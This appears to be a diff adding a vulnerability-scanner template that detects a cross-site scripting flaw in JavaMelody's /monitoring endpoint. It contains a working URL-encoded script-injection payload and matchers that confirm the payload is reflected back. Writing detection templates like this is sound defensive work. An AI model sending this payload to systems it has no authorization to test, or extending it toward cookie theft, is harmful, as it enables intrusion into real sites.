@@ -1,0 +1,32 @@
+id: "java-melody-xss"
+name: "JavaMelody - Cross-Site Scripting"
+severity: "high"
+description: "JavaMelody contains a cross-site scripting vulnerability via the monitoring parameter. An attacker can execute arbitrary script in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
+tech:
+  - "java"
+tags:
+  - "xss"
+  - "javamelody"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://github.com/Hurdano/JavaMelody-XSS"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "</script><script>alert(document.domain)</script>"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
